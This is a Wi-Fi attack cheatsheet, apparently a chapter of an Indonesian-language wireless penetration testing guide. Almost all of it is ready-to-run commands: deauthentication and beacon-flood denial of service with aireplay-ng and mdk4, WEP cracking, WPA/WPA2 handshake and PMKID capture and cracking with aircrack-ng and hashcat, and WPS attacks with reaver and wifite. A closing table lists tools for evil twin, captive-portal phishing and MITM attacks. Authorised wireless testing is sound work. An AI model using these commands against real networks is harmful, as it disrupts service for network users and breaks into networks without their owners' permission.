# 10 - Cheatsheet

Referensi cepat perintah untuk penggunaan lapangan.

## Perintah Dasar Linux

```bash
# View wireless interfaces
iwconfig

# Monitor mode
airmon-ng start $IFACE
airmon-ng check kill

# Packet capture
airodump-ng $IFACE

# Set monitor mode manual
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up

# Restart network manager
systemctl restart NetworkManager.service

# Show MAC
macchanger -s mon0

# TX power
iw reg set B0 && iwconfig wlan0 txpower 30
```

## Monitoring & Scanning

```bash
# Monitor 2.4 GHz
airodump-ng mon0

# Monitor 5 GHz
airodump-ng --band a mon0

# Monitor specific channel
airodump-ng -c <channel> mon0

# Monitor specific AP
airodump-ng -c <channel> --bssid <MAC_AP> -w <capture> mon0

# List networks
airodump-ng $IFACE -c $CHANNEL -e $ESSID

# Hidden SSID
aireplay-ng --deauth 20 -a <MAC_AP> mon0

# Probe request graph
airgraph-ng -i TARGETNET-01.csv -g CPG -o targetnet-pnl.png

# Kismet all-in-one
kismet -c mon0
```

## Denial of Service

```bash
# Deauth
aireplay-ng --deauth 20 -c <MAC_target> -a <MAC_AP> mon0

# Beacon flood
mdk4 mon0 b -a -w nta -m

# Auth DoS
mdk4 mon0 a -m -a <MAC_AP>

# EAPOL start
mdk4 mon0 e -t <MAC_AP>

# EAPOL logoff
mdk4 mon0 e -t <MAC_AP> -l

# Deauth flood
mdk4 <interface> d -c <CHANNEL> -E <ESSID> -B <BSSID>
```

## WEP Cracking

```bash
# Fake auth
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <IFACE>

# ARP replay
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <IFACE>

# Deauth
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <IFACE>

# Fragmentation
aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <IFACE>

# Chop chop
aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <IFACE>

# Forge packet
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAG.xor>

# Crack
aircrack-ng <CAPTURE>
aircrack-ng -f <FUDGE> <CAPTURE>
aircrack-ng -w <WORDLIST> <CAPTURE>
```

## WPA/WPA2 Cracking

```bash
# Capture handshake
airodump-ng -w <CAPTURE> -c <CHANNEL> --bssid <BSSID> <IFACE>
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <IFACE>

# Crack with aircrack-ng
aircrack-ng <CAPTURE> -w <WORDLIST>

# PMKID
hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>
hcxpcaptool -z capture.16800 capture.pcapng
hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>

# WPS
reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv
wifite --wps-only [--bully]

# Wifite automated
wifite --pmkid [--pmkid-timeout <sec>]
```

## Quick Reference Tools

| Serangan | Tool Utama |
|----------|-----------|
| Monitoring | airodump-ng, kismet |
| DoS / Deauth | aireplay-ng, mdk4 |
| WEP | aircrack-ng suite |
| WPA/WPA2 PSK | aircrack-ng, hashcat, coWPAtty |
| WPS | reaver, bully, wifite |
| PMKID | hcxdumptool, hashcat |
| WPA3 | dragondrain, dragonforce, dragonslayer |
| Enterprise | eaphammer, air-hammer, freeradius-wpe |
| Evil Twin | eaphammer, airgeddon, wifipumpkin3 |
| Captive Portal | wifiphisher, ettercap |
| MITM | ettercap, bettercap |
